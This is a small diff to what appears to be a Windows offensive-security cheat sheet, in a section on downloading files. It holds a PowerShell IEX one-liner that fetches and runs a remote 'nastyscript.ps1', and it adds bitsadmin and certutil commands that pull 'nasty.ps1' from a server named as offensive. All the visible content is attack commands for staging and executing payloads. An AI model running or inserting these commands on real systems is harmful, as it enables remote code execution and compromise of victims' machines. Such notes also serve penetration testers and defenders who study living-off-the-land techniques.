@@ -11,7 +11,12 @@ Get-Content file.txt
 ----
 
 #Download a file
+#Powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")
+
+#CMD
+bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
+certutil.exe -urlcache -split -f "https://my.offensive.server/nasty.ps1" nice.ps1
 
 ----
 
